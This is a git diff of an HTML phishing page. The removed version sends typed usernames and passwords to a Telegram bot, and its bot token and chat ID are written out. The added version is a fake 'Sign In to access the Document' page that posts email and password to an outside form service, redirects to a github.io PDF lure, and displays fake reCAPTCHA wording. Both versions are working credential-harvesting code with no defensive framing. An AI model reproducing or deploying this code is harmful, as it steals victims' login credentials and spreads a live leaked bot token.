@@ -1,48 +1,28 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Login Form</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-<form id="loginForm">
-  <input type="text" id="username" placeholder="Username" required>
-  <input type="password" id="password" placeholder="Password" required>
-  <button type="submit">Login</button>
-</form>
-
-<script>
-  const botToken = 'YOUR_BOT_TOKEN_HERE';7692530921:AAFC3jdquS4ntnTKaxMjuOpLw0ODSuStcIY
-  const chatId = 'YOUR_CHAT_ID_HERE';925862489
-
-  document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    const message = `🔐 *Login Attempt*:\n👤 Username: ${username}\n🔑 Password: ${password}`;
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    })
-    .then(response => {
-      if (response.ok) {
-        alert("Login info sent to Telegram.");
-      } else {
-        alert("Failed to send login info.");
-      }
-    });
-  });
-</script>
-
+    <div class="right-side">
+        <form  id="contact-form" method="POST" action="https://www.formbackend.com/f/adcbb088869db5e2">
+            <h1>Sign In</h1>
+            <p>To Access the <a href="#">Document</a></p>
+            <span>Email address</span>
+            <input type="text" name="email">
+            <span>Password</span>
+            <input type="text" name="name">
+            <button class="btn1" type="submit" value="Submit">Continue</button>
+            <p class="end">
+                Protected by re CAPTCHA and subject to the Google <a href="#">Privacy Policy</a>
+                and <a href="#">Terms of service</a>
+            </p>
+            <input type="hidden" name="_next" value="https://pdfopening.github.io/file-file//fileopen/index.html">
+        </form>
+    </div>
 </body>
 </html>
